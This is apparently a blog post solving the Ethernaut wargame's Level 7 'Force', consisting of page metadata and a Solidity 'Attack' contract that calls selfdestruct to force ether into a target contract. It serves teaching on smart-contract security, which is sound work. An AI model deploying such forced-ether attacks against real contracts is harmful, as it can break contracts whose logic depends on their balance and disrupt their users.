+++
title = 'Ethernaut Level 7 - Force'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Selfdestruct to win'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

interface EtherGame {}

// Mostly copied from https://solidity-by-example.org/hacks/self-destruct/
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

```